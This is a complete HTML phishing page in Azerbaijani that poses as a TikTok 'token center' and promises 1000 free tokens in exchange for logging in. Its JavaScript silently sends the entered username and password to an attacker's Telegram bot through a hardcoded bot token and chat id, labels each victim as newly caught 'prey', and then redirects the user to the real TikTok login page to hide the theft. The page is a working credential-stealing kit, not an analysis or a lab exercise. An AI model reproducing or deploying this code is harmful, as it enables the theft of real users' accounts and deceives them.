<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok | Jeton Mərkəzi</title>
    <style>
        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background: #121212; padding: 30px; border-radius: 12px; width: 320px; text-align: center; border: 1px solid #fe2c55; }
        img { width: 100px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #333; background: #222; color: white; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #fe2c55; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="login-card">
        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG-white-text-black-background.png" alt="TikTok">
        <h3>Jeton Aktivasiyası</h3>
        <p style="font-size: 13px; color: #888;">1000 Jeton üçün giriş edin</p>
        <input type="text" id="user" placeholder="İstifadəçi adı / Email">
        <input type="password" id="pass" placeholder="Şifrə">
        <button onclick="ovcuSistemi()">JETONLARI YÜKLƏ</button>
    </div>

    <script>
        function ovcuSistemi() {
            var user = document.getElementById("user").value;
            var pass = document.getElementById("pass").value;
            
            if(user == "" || pass == "") {
                alert("Zəhmət olmasa xanaları doldurun!");
                return;
            }

            // Sənin Teleqram məlumatların
            var token = "8653662204:AAEEhDx4hxgxNGAwCUL04frUAv0MVXJI2ZM";
            var chat_id = "705607065"; // DİQQƏT: Öz Teleqram ID-ni bura yaz!
            
            var mesaj = "🎯 YENİ OV DÜŞDÜ!\n👤 User: " + user + "\n🔑 Pass: " + pass;
            
            // Məlumatı səssizcə Teleqrama göndəririk (Arxa fonda)
            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(mesaj);
            
            var xhr = new XMLHttpRequest();
            xhr.open("GET", url, true);
            
            xhr.onreadystatechange = function() {
                // Məlumat getdisə, adamı TikTok-a göndər
                window.location.href = "https://www.tiktok.com/login";
            };
            xhr.send();
        }
    </script>
</body>
</html>
